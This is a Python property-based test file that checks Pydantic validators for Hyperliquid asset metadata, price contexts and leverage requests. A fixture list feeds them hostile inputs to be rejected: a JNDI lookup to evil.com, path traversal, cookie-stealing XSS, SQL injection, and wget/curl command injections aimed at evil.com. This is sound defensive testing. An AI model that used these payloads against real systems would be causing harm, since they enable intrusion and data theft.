"""Property-based tests for Hyperliquid raw meta and asset context models.

These tests validate critical security boundary models that process external metadata and asset context data.
The models tested here are essential for asset configuration, leverage management, and market context.

SECURITY CRITICAL: These raw models protect against:
- Malicious asset definition data that could manipulate trading parameters
- Financial precision errors in funding rates and prices
- Buffer overflow attacks through oversized asset lists
- Injection attacks through malformed asset names
- Leverage manipulation that could affect risk parameters
- Market data manipulation through invalid price contexts
- Configuration attacks through invalid metadata structures

Property testing ensures comprehensive coverage of metadata edge cases and adversarial inputs.
"""

import json
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.exceptions.field_validation import TypeFieldError
from cyberdelta.apis.exceptions.parsing import StructureTypeError
from cyberdelta.apis.hyperliquid.models.hl_raw_meta_and_asset_ctxs import (
    HyperliquidRawAssetCtx,
    HyperliquidRawAssetDefinition,
    HyperliquidRawMetaAndAssetCtxsRequestPayload,
    HyperliquidRawMetaAndAssetCtxsResponse,
    HyperliquidRawMetaRequestPayload,
    HyperliquidRawMetaResponse,
    HyperliquidRawUpdateIsolatedMarginRequest,
    HyperliquidRawUpdateLeverageRequest,
)
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR META AND ASSET CONTEXTS MODEL TESTING
# =============================================================================


def asset_name_strategy() -> SearchStrategy[str]:
    """Generate valid asset name strings."""
    return st.one_of([
        # Common cryptocurrencies
        st.sampled_from([
            "BTC",
            "ETH",
            "SOL",
            "USDC",
            "USDT",
            "AVAX",
            "ATOM",
            "DOT",
            "LINK",
            "UNI",
            "MATIC",
            "ADA",
            "XRP",
            "DOGE",
            "SHIB",
            "FTM",
            "NEAR",
            "ALGO",
            "MANA",
            "SAND",
            "APE",
            "AAVE",
            "CRV",
            "SNX",
            "1INCH",
            "COMP",
            "MKR",
            "YFI",
            "SUSHI",
            "LRC",
            "ENJ",
            "BAT",
        ]),
        # Generated asset names
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_./:"
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 64),
        # Special format symbols
        st.sampled_from([
            "BTC-USD",
            "ETH-USDC",
            "BTC/USD",
            "wBTC",
            "stETH",
            "USDC.e",
            "tBTC",
            "tETH",
            "ΞTH",
            "₿TC",
            "BTC USD",
            "ETH\n",
            "DROP TABLE users;",
        ]),
    ])


def decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for financial values."""
    return st.one_of([
        st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal(-100000), max_value=Decimal(100000), places=6).map(str),
        st.just("0"),
        st.just("0.0"),
        st.just("1.0"),
        st.just("-1.0"),
        st.just("100.0"),
        st.just("-100.0"),
        st.just("1234.56"),
        st.just("-1234.56"),
        st.just("50000.123456"),
        st.just("-50000.123456"),
        st.just("0.00000001"),
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
        st.just("1e1000"),
        st.just("0.12345678901234567890"),  # Excessive precision
    ])


@st.composite
def valid_asset_definition_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid asset definition data."""
    return {
        "name": draw(asset_name_strategy()),
        "szDecimals": draw(st.integers(min_value=0, max_value=18)),
        "maxLeverage": draw(st.integers(min_value=1, max_value=1000)),
        "onlyIsolated": draw(st.booleans()),
    }


@st.composite
def valid_asset_ctx_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid asset context data."""
    data = {
        "name": draw(asset_name_strategy()),
        "funding": draw(decimal_str_strategy()),
        "markPx": draw(decimal_str_strategy()),
        "prevDayPx": draw(decimal_str_strategy()),
        "dayNtlVlm": draw(decimal_str_strategy()),
        "openInterest": draw(decimal_str_strategy()),
        "oraclePx": draw(decimal_str_strategy()),
        "dayBaseVlm": draw(decimal_str_strategy()),
    }
    # Optional impactPx field
    if draw(st.booleans()):
        data["impactPx"] = draw(decimal_str_strategy())
    return data


@st.composite
def valid_meta_response_data(draw: st.DrawFn) -> dict[str, list[dict[str, Any]]]:
    """Generate valid meta response data."""
    universe = draw(st.lists(valid_asset_definition_data(), min_size=0, max_size=50))
    return {"universe": universe}


@st.composite
def valid_update_leverage_request_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid update leverage request data."""
    return {
        "asset": draw(st.integers(min_value=0, max_value=1000)),
        "isCross": draw(st.booleans()),
        "leverage": draw(st.integers(min_value=1, max_value=1000)),
    }


@st.composite
def valid_update_margin_request_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid update isolated margin request data."""
    return {
        "asset": draw(st.integers(min_value=0, max_value=1000)),
        "isBuy": draw(st.booleans()),
        "ntli": draw(st.integers(min_value=0, max_value=1000000)),
    }


def malicious_meta_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for meta/asset security testing."""
    return st.one_of([
        # Meta manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-meta}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('meta-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE assets;--"),
        st.just("1' UNION SELECT * FROM configs--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("M" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.assets.find(); //"),
        # JSON injection
        st.just('{"$where": "this.leverage > 1000"}'),
        # Invalid decimals
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("not_a_number"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ASSET DEFINITION MODEL
# =============================================================================


class TestHyperliquidRawAssetDefinitionProperties:
    """Property-based tests for asset definition validation and security."""

    @given(asset_data=valid_asset_definition_data())
    def test_asset_definition_validation_success_properties(
        self, asset_data: dict[str, Any]
    ) -> None:
        """Property: Valid asset definition data should always create valid objects."""
        # Skip invalid data
        name = asset_data["name"]
        assume(isinstance(name, str) and name.strip())
        assume(len(name.encode("utf-8")) <= 64)
        assume(isinstance(asset_data["szDecimals"], int) and 0 <= asset_data["szDecimals"] <= 18)
        assume(
            isinstance(asset_data["maxLeverage"], int) and 1 <= asset_data["maxLeverage"] <= 1000
        )
        assume(isinstance(asset_data["onlyIsolated"], bool))

        obj = HyperliquidRawAssetDefinition.model_validate(asset_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawAssetDefinition)
        assert obj.name == asset_data["name"]
        assert obj.sz_decimals == asset_data["szDecimals"]
        assert obj.max_leverage == asset_data["maxLeverage"]
        assert obj.only_isolated == asset_data["onlyIsolated"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["name", "szDecimals", "maxLeverage", "onlyIsolated"]),
        malicious_value=malicious_meta_strategy(),
    )
    def test_asset_definition_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Asset definition should reject malicious inputs safely."""
        base_data = {
            "name": "ETH",
            "szDecimals": 6,
            "maxLeverage": 50,
            "onlyIsolated": True,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawAssetDefinition.model_validate(base_data)

    @given(invalid_sz_decimals=st.integers().filter(lambda x: x < 0 or x > 18))
    def test_asset_definition_invalid_sz_decimals_properties(
        self, invalid_sz_decimals: int
    ) -> None:
        """Property: Asset definition should validate szDecimals constraints."""
        asset_data = {
            "name": "ETH",
            "szDecimals": invalid_sz_decimals,
            "maxLeverage": 50,
            "onlyIsolated": True,
        }

        # Property: Invalid szDecimals should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawAssetDefinition.model_validate(asset_data)

    @given(invalid_max_leverage=st.integers().filter(lambda x: x < 1 or x > 1000))
    def test_asset_definition_invalid_max_leverage_properties(
        self, invalid_max_leverage: int
    ) -> None:
        """Property: Asset definition should validate maxLeverage constraints."""
        asset_data = {
            "name": "ETH",
            "szDecimals": 6,
            "maxLeverage": invalid_max_leverage,
            "onlyIsolated": True,
        }

        # Property: Invalid maxLeverage should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawAssetDefinition.model_validate(asset_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_asset_definition_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: Asset definition should forbid extra fields."""
        asset_data = {
            "name": "ETH",
            "szDecimals": 6,
            "maxLeverage": 50,
            "onlyIsolated": True,
        }
        asset_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawAssetDefinition.model_validate(asset_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ASSET CTX MODEL
# =============================================================================


class TestHyperliquidRawAssetCtxProperties:
    """Property-based tests for asset context validation and security."""

    @given(ctx_data=valid_asset_ctx_data())
    def test_asset_ctx_validation_success_properties(self, ctx_data: dict[str, Any]) -> None:
        """Property: Valid asset context data should always create valid objects."""
        # Skip invalid data
        name = ctx_data["name"]
        assume(isinstance(name, str) and name.strip())
        assume(len(name.encode("utf-8")) <= 64)

        # Validate decimal fields
        for field in [
            "funding",
            "markPx",
            "prevDayPx",
            "dayNtlVlm",
            "openInterest",
            "oraclePx",
            "dayBaseVlm",
        ]:
            value = ctx_data[field]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
            except (ValueError, TypeError):
                assume(False)

        # Validate optional impactPx
        if "impactPx" in ctx_data:
            value = ctx_data["impactPx"]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
            except (ValueError, TypeError):
                assume(False)

        obj = HyperliquidRawAssetCtx.model_validate(ctx_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawAssetCtx)
        assert obj.name == ctx_data["name"]

        # Property: Decimal fields should be normalized
        assert Decimal(obj.funding) == Decimal(ctx_data["funding"])
        assert Decimal(obj.mark_px) == Decimal(ctx_data["markPx"])
        assert Decimal(obj.prev_day_px) == Decimal(ctx_data["prevDayPx"])

        # Property: Optional impactPx should be handled correctly
        if "impactPx" in ctx_data:
            assert obj.impact_px is not None
            assert Decimal(obj.impact_px) == Decimal(ctx_data["impactPx"])
        else:
            assert obj.impact_px is None

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from([
            "name",
            "funding",
            "markPx",
            "prevDayPx",
            "dayNtlVlm",
            "openInterest",
            "oraclePx",
            "dayBaseVlm",
            "impactPx",
        ]),
        malicious_value=malicious_meta_strategy(),
    )
    def test_asset_ctx_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Asset context should reject malicious inputs safely."""
        base_data = {
            "name": "BTC",
            "funding": "0.0001",
            "markPx": "30000.0",
            "prevDayPx": "29500.0",
            "dayNtlVlm": "1000000.0",
            "openInterest": "500000.0",
            "oraclePx": "30000.5",
            "dayBaseVlm": "2000000.0",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawAssetCtx.model_validate(base_data)

    @given(
        invalid_decimal=st.one_of([
            st.just(""),
            st.just("   "),
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("not_a_number"),
            st.just("1..0"),
            st.text(min_size=65, max_size=100),
        ])
    )
    def test_asset_ctx_invalid_decimal_properties(self, invalid_decimal: str) -> None:
        """Property: Asset context should validate decimal constraints."""
        ctx_data = {
            "name": "BTC",
            "funding": invalid_decimal,
            "markPx": "30000.0",
            "prevDayPx": "29500.0",
            "dayNtlVlm": "1000000.0",
            "openInterest": "500000.0",
            "oraclePx": "30000.5",
            "dayBaseVlm": "2000000.0",
        }

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(invalid_decimal.strip() if invalid_decimal else "")
            is_finite = decimal_val.is_finite()
            is_empty = not invalid_decimal.strip()
            is_too_long = len(invalid_decimal.encode("utf-8")) > 64

            if is_finite and not is_empty and not is_too_long:
                # Property: Valid finite decimals should be accepted
                obj = HyperliquidRawAssetCtx.model_validate(ctx_data)
                assert Decimal(obj.funding) == decimal_val
            else:
                # Property: Non-finite, empty, or too long values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                    HyperliquidRawAssetCtx.model_validate(ctx_data)

        except (ValueError, TypeError):
            # Property: Unparseable strings should be rejected
            with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                HyperliquidRawAssetCtx.model_validate(ctx_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW META RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawMetaResponseProperties:
    """Property-based tests for meta response validation and security."""

    @given(meta_data=valid_meta_response_data())
    def test_meta_response_validation_success_properties(
        self, meta_data: dict[str, list[dict[str, Any]]]
    ) -> None:
        """Property: Valid meta response data should always create valid objects."""
        # Validate universe items
        valid_universe = []
        for asset_def in meta_data["universe"]:
            try:
                name = asset_def["name"]
                assume(isinstance(name, str) and name.strip())
                assume(len(name.encode("utf-8")) <= 64)
                assume(
                    isinstance(asset_def["szDecimals"], int) and 0 <= asset_def["szDecimals"] <= 18
                )
                assume(
                    isinstance(asset_def["maxLeverage"], int)
                    and 1 <= asset_def["maxLeverage"] <= 1000
                )
                assume(isinstance(asset_def["onlyIsolated"], bool))
                valid_universe.append(asset_def)
            except (ValueError, TypeError):
                pass

        meta_data = {"universe": valid_universe}
        obj = HyperliquidRawMetaResponse.model_validate(meta_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawMetaResponse)
        assert len(obj.universe) == len(valid_universe)

        # Property: All assets should be properly typed
        for asset in obj.universe:
            assert isinstance(asset, HyperliquidRawAssetDefinition)

    def test_meta_response_empty_universe_properties(self) -> None:
        """Property: Empty universe should be valid."""
        meta_data: dict[str, list[dict[str, Any]]] = {"universe": []}
        obj = HyperliquidRawMetaResponse.model_validate(meta_data)
        assert obj.universe == []

    @given(
        invalid_universe=st.one_of([
            st.text(),
            st.integers(),
            st.floats(),
            st.booleans(),
            st.none(),
            st.dictionaries(st.text(), st.text()),
        ])
    )
    def test_meta_response_invalid_universe_properties(self, invalid_universe: Any) -> None:
        """Property: Meta response should reject non-list universe."""
        meta_data = {"universe": invalid_universe}

        # Property: Invalid universe should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            HyperliquidRawMetaResponse.model_validate(meta_data)


# =============================================================================
# PROPERTY TESTS FOR REQUEST PAYLOAD MODELS
# =============================================================================


class TestHyperliquidRawRequestPayloadProperties:
    """Property-based tests for request payload validation and security."""

    @given(
        request_type=st.one_of([
            st.just("meta"),
            st.just("META"),
            st.just("Meta"),
            st.just("invalid"),
            st.just(""),
            st.just("metaAndAssetCtxs"),
        ])
    )
    def test_meta_request_type_validation_properties(self, request_type: str) -> None:
        """Property: Meta request type field should validate against literal value."""
        payload_data = {"type": request_type}

        if request_type == "meta":
            # Property: Valid type should be accepted
            obj = HyperliquidRawMetaRequestPayload.model_validate(payload_data)
            assert obj.type == "meta"
        else:
            # Property: Invalid types should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawMetaRequestPayload.model_validate(payload_data)

    @given(
        request_type=st.one_of([
            st.just("metaAndAssetCtxs"),
            st.just("meta_and_asset_ctxs"),
            st.just("MetaAndAssetCtxs"),
            st.just("invalid"),
            st.just(""),
        ])
    )
    def test_meta_and_asset_ctxs_request_type_validation_properties(
        self, request_type: str
    ) -> None:
        """Property: MetaAndAssetCtxs request type field should validate against literal value."""
        payload_data = {"type": request_type}

        if request_type == "metaAndAssetCtxs":
            # Property: Valid type should be accepted
            obj = HyperliquidRawMetaAndAssetCtxsRequestPayload.model_validate(payload_data)
            assert obj.type == "metaAndAssetCtxs"
        else:
            # Property: Invalid types should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawMetaAndAssetCtxsRequestPayload.model_validate(payload_data)


# =============================================================================
# PROPERTY TESTS FOR UPDATE REQUEST MODELS
# =============================================================================


class TestHyperliquidRawUpdateRequestProperties:
    """Property-based tests for update request validation and security."""

    @given(leverage_data=valid_update_leverage_request_data())
    def test_update_leverage_request_validation_success_properties(
        self, leverage_data: dict[str, Any]
    ) -> None:
        """Property: Valid leverage request data should always create valid objects."""
        # Skip invalid data
        assume(isinstance(leverage_data["asset"], int) and leverage_data["asset"] >= 0)
        assume(isinstance(leverage_data["isCross"], bool))
        assume(
            isinstance(leverage_data["leverage"], int) and 1 <= leverage_data["leverage"] <= 1000
        )

        obj = HyperliquidRawUpdateLeverageRequest.model_validate(leverage_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUpdateLeverageRequest)
        assert obj.asset == leverage_data["asset"]
        assert obj.is_cross == leverage_data["isCross"]
        assert obj.leverage == leverage_data["leverage"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(margin_data=valid_update_margin_request_data())
    def test_update_margin_request_validation_success_properties(
        self, margin_data: dict[str, Any]
    ) -> None:
        """Property: Valid margin request data should always create valid objects."""
        # Skip invalid data
        assume(isinstance(margin_data["asset"], int) and margin_data["asset"] >= 0)
        assume(isinstance(margin_data["isBuy"], bool))
        assume(isinstance(margin_data["ntli"], int) and margin_data["ntli"] >= 0)

        obj = HyperliquidRawUpdateIsolatedMarginRequest.model_validate(margin_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUpdateIsolatedMarginRequest)
        assert obj.asset == margin_data["asset"]
        assert obj.is_buy == margin_data["isBuy"]
        assert obj.ntli == margin_data["ntli"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["asset", "isCross", "leverage"]),
        malicious_value=malicious_meta_strategy(),
    )
    def test_update_leverage_request_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Update leverage request should reject malicious inputs safely."""
        base_data = {"asset": 1, "isCross": True, "leverage": 10}
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            HyperliquidRawUpdateLeverageRequest.model_validate(base_data)

    @given(
        field_name=st.sampled_from(["asset", "isBuy", "ntli"]),
        malicious_value=malicious_meta_strategy(),
    )
    def test_update_margin_request_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Update margin request should reject malicious inputs safely."""
        base_data = {"asset": 1, "isBuy": False, "ntli": 100}
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            HyperliquidRawUpdateIsolatedMarginRequest.model_validate(base_data)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawMetaIntegrationProperties:
    """Integration property tests for meta models working together."""

    @given(
        asset_data=valid_asset_definition_data(),
        ctx_data=valid_asset_ctx_data(),
        malicious_entries=st.dictionaries(
            malicious_meta_strategy(),
            malicious_meta_strategy(),
            min_size=1,
            max_size=3,
        ),
    )
    def test_meta_models_adversarial_input_properties(
        self,
        asset_data: dict[str, Any],
        ctx_data: dict[str, Any],
        malicious_entries: dict[Any, Any],
    ) -> None:
        """Property: Meta models should safely handle adversarial input."""
        # Mix valid and malicious data for asset definition
        mixed_asset_data = {**asset_data, **malicious_entries}

        # Property: Mixed adversarial input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError, EmptyStringError)):
            HyperliquidRawAssetDefinition.model_validate(mixed_asset_data)

        # Mix valid and malicious data for asset context
        mixed_ctx_data = {**ctx_data, **malicious_entries}

        # Property: Mixed adversarial input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError, EmptyStringError)):
            HyperliquidRawAssetCtx.model_validate(mixed_ctx_data)

    @given(asset_data=valid_asset_definition_data())
    def test_asset_definition_json_serialization_properties(
        self, asset_data: dict[str, Any]
    ) -> None:
        """Property: Asset definition should maintain JSON serialization compatibility."""
        # Skip invalid data
        name = asset_data["name"]
        assume(isinstance(name, str) and name.strip())
        assume(len(name.encode("utf-8")) <= 64)
        assume(isinstance(asset_data["szDecimals"], int) and 0 <= asset_data["szDecimals"] <= 18)
        assume(
            isinstance(asset_data["maxLeverage"], int) and 1 <= asset_data["maxLeverage"] <= 1000
        )
        assume(isinstance(asset_data["onlyIsolated"], bool))

        obj = HyperliquidRawAssetDefinition.model_validate(asset_data)
        json_str = obj.model_dump_json()
        parsed_json = json.loads(json_str)

        # Property: Should be able to reconstruct from JSON
        reconstructed = HyperliquidRawAssetDefinition.model_validate(parsed_json)
        assert reconstructed.name == obj.name
        assert reconstructed.sz_decimals == obj.sz_decimals
        assert reconstructed.max_leverage == obj.max_leverage
        assert reconstructed.only_isolated == obj.only_isolated


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawAssetDefinition_real_world_example() -> None:
    """Test with real-world asset definition data."""
    payload = {
        "name": "ETH",
        "szDecimals": 6,
        "maxLeverage": 50,
        "onlyIsolated": True,
    }
    obj = HyperliquidRawAssetDefinition.model_validate(payload)
    assert obj.name == "ETH"
    assert obj.sz_decimals == 6
    assert obj.max_leverage == 50
    assert obj.only_isolated is True


def test_HyperliquidRawAssetCtx_real_world_example() -> None:
    """Test with real-world asset context data."""
    payload = {
        "name": "BTC",
        "funding": "0.0001",
        "markPx": "30000.0",
        "prevDayPx": "29500.0",
        "dayNtlVlm": "1000000.0",
        "impactPx": "0.1",
        "openInterest": "500000.0",
        "oraclePx": "30000.5",
        "dayBaseVlm": "2000000.0",
    }
    obj = HyperliquidRawAssetCtx.model_validate(payload)
    assert obj.name == "BTC"
    assert obj.funding == "0.0001"
    assert obj.impact_px == "0.1"


def test_HyperliquidRawAssetCtx_optional_impact_px() -> None:
    """Test asset context without optional impactPx."""
    payload = {
        "name": "BTC",
        "funding": "0.0001",
        "markPx": "30000.0",
        "prevDayPx": "29500.0",
        "dayNtlVlm": "1000000.0",
        "openInterest": "500000.0",
        "oraclePx": "30000.5",
        "dayBaseVlm": "2000000.0",
    }
    obj = HyperliquidRawAssetCtx.model_validate(payload)
    assert obj.impact_px is None


def test_HyperliquidRawAssetCtx_excessive_precision() -> None:
    """Test with excessive precision in funding."""
    payload = {
        "name": "BTC",
        "funding": "0.12345678901234567890",
        "markPx": "30000.0",
        "prevDayPx": "29500.0",
        "dayNtlVlm": "1000000.0",
        "openInterest": "500000.0",
        "oraclePx": "30000.5",
        "dayBaseVlm": "2000000.0",
    }
    obj = HyperliquidRawAssetCtx.model_validate(payload)
    # Business logic rounds to 8 decimal places
    assert obj.funding == "0.12345679"


def test_HyperliquidRawMetaResponse_real_world_example() -> None:
    """Test with real-world meta response data."""
    payload = {
        "universe": [
            {"name": "ETH", "szDecimals": 6, "maxLeverage": 50, "onlyIsolated": True},
            {"name": "BTC", "szDecimals": 6, "maxLeverage": 100, "onlyIsolated": False},
        ],
    }
    obj = HyperliquidRawMetaResponse.model_validate(payload)
    assert len(obj.universe) == 2
    assert obj.universe[0].name == "ETH"
    assert obj.universe[1].name == "BTC"


def test_HyperliquidRawMetaAndAssetCtxsResponse_real_world_example() -> None:
    """Test with real-world meta and asset contexts response."""
    payload = [
        {"universe": [{"name": "ETH", "szDecimals": 6, "maxLeverage": 50, "onlyIsolated": True}]},
        [
            {
                "name": "ETH",
                "funding": "0.0001",
                "markPx": "30000.0",
                "prevDayPx": "29500.0",
                "dayNtlVlm": "1000000.0",
                "openInterest": "500000.0",
                "oraclePx": "30000.5",
                "dayBaseVlm": "2000000.0",
            },
        ],
    ]
    obj = HyperliquidRawMetaAndAssetCtxsResponse.model_validate(payload)
    assert obj.meta.universe[0].name == "ETH"
    assert obj.asset_ctxs[0].name == "ETH"


def test_HyperliquidRawUpdateLeverageRequest_real_world_example() -> None:
    """Test with real-world update leverage request."""
    payload = {"asset": 1, "isCross": True, "leverage": 10}
    obj = HyperliquidRawUpdateLeverageRequest.model_validate(payload)
    assert obj.asset == 1
    assert obj.is_cross is True
    assert obj.leverage == 10


def test_HyperliquidRawUpdateIsolatedMarginRequest_real_world_example() -> None:
    """Test with real-world update isolated margin request."""
    payload = {"asset": 1, "isBuy": False, "ntli": 100}
    obj = HyperliquidRawUpdateIsolatedMarginRequest.model_validate(payload)
    assert obj.asset == 1
    assert obj.is_buy is False
    assert obj.ntli == 100


def test_HyperliquidRawAssetDefinition_unicode_name() -> None:
    """Test asset definition with unicode name."""
    payload = {"name": "ΞTH", "szDecimals": 6, "maxLeverage": 50, "onlyIsolated": True}
    obj = HyperliquidRawAssetDefinition.model_validate(payload)
    assert obj.name == "ΞTH"


def test_HyperliquidRawAssetDefinition_extra_field() -> None:
    """Test validation fails with extra fields."""
    payload = {
        "name": "ETH",
        "szDecimals": 6,
        "maxLeverage": 50,
        "onlyIsolated": True,
        "extra": "field",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawAssetDefinition.model_validate(payload)


def test_HyperliquidRawAssetCtx_invalid_decimal() -> None:
    """Test validation fails for invalid decimal values."""
    payload = {
        "name": "BTC",
        "funding": "NaN",
        "markPx": "inf",
        "prevDayPx": "29500.0",
        "dayNtlVlm": "1000000.0",
        "openInterest": "500000.0",
        "oraclePx": "30000.5",
        "dayBaseVlm": "2000000.0",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawAssetCtx.model_validate(payload)


def test_HyperliquidRawMetaAndAssetCtxsResponse_invalid_structure() -> None:
    """Test validation fails for invalid structure."""
    payload = {"not": "alist"}
    with pytest.raises(StructureTypeError):
        HyperliquidRawMetaAndAssetCtxsResponse.model_validate(payload)


def test_HyperliquidRawMetaRequestPayload_invalid_type() -> None:
    """Test validation fails for invalid type."""
    payload = {"type": "notmeta"}
    with pytest.raises(ValidationError):
        HyperliquidRawMetaRequestPayload.model_validate(payload)


def test_HyperliquidRawUpdateLeverageRequest_invalid_bounds() -> None:
    """Test validation fails for invalid bounds."""
    payload = {"asset": -1, "isCross": True, "leverage": 2000}
    with pytest.raises(ValidationError):
        HyperliquidRawUpdateLeverageRequest.model_validate(payload)
